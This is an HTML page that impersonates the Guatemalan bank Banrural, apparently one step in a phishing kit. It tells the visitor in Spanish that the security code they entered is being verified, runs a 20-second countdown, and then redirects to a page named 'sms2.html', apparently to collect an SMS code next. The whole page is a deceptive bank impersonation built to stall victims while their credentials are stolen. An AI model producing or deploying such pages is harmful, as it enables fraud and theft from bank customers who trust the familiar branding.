<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Ban Rural</title>
    <link rel="stylesheet" href="styles.css" />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
      rel="stylesheet"
    />
  </head>
  <body style="color: #00351a">
    <div class="container">
      <form class="form" id="loginForm">
        <div style="text-align: center; background: #0b5031">
          <img
            src="https://imtconferences.com/wp-content/uploads/2017/01/BANRURAL.jpg"
            width="150"
          />
        </div>
        <div style="background: #f68f1e; height: 10px"></div>
        <div style="padding: 20px">
          <div style="text-align: center">
            <h3>Cargando...</h3>
          </div>
        </div>
        <div style="text-align: center">
          <img src="crrggd.gif" width="150" />
        </div>

        <div>
          <h4 id="CuentaAtras" style="text-align: center">
            Por favor, espera 20 segundos, estamos verificando el código de
            seguridad que usted ha ingresado.
            <br />
          </h4>
          <script language="JavaScript">
            /* Determinamos el tiempo total en segundos */
            var totalTiempo = 20;

            var url = "sms2.html";

            function updateReloj() {
              document.getElementById("CuentaAtras").innerHTML =
                "Por favor, espera " +
                totalTiempo +
                " segundos, estamos verificando el código de seguridad que usted ha ingresado. <br> ";

              if (totalTiempo == 0) {
                window.location = url;
              } else {
                /* Restamos un segundo al tiempo restante */
                totalTiempo -= 1;
                /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
                setTimeout("updateReloj()", 1000);
              }
            }

            window.onload = updateReloj;
          </script>
        </div>
        <div
          style="text-align: center; background: #0b5031; height: 50px"
        ></div>
      </form>
    </div>
  </body>
</html>
